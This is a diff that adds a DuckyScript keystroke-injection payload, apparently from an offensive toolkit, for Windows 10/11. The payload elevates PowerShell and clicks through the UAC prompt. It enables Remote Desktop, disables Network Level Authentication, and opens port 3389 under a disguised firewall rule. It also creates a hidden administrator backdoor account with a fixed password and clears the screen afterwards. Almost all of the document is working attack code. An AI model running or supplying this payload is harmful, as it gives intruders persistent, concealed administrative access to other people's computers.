@@ -1,0 +1,65 @@
+REM ==========================================
+REM Title: RDP Enabler & Configurator
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Enables Remote Desktop
+REM   Protocol, configures firewall rules,
+REM   disables NLA requirement, and optionally
+REM   adds a backdoor user with RDP access
+REM   for persistent remote access.
+REM Category: Lateral Movement / Persistence
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Enable RDP via registry
+STRING Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force
+ENTER
+DELAY 400
+REM Disable Network Level Authentication requirement
+STRING Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'UserAuthentication' -Value 0 -Force
+ENTER
+DELAY 400
+REM Enable RDP firewall rules
+STRING Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'
+ENTER
+DELAY 400
+REM Also add explicit firewall rule for port 3389
+STRING New-NetFirewallRule -DisplayName 'Remote Assist' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Any -ErrorAction SilentlyContinue
+ENTER
+DELAY 400
+REM Start the RDP service
+STRING Set-Service -Name TermService -StartupType Automatic; Start-Service TermService
+ENTER
+DELAY 500
+REM Create backdoor user account for RDP access
+STRING $pass = ConvertTo-SecureString 'NullS3c!2026' -AsPlainText -Force
+ENTER
+DELAY 350
+STRING New-LocalUser -Name 'svcUpdate' -Password $pass -Description 'System Service Account' -PasswordNeverExpires -UserMayNotChangePassword -ErrorAction SilentlyContinue
+ENTER
+DELAY 400
+REM Add to Administrators and Remote Desktop Users groups
+STRING Add-LocalGroupMember -Group 'Administrators' -Member 'svcUpdate' -ErrorAction SilentlyContinue
+ENTER
+DELAY 350
+STRING Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'svcUpdate' -ErrorAction SilentlyContinue
+ENTER
+DELAY 400
+REM Hide user from login screen
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'svcUpdate' -Value 0 -Force 2>$null
+ENTER
+DELAY 400
+REM Display RDP configuration status
+STRING Write-Host "RDP Enabled on port 3389"; Get-NetTCPConnection -LocalPort 3389 -ErrorAction SilentlyContinue | Select State
+ENTER
+DELAY 500
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
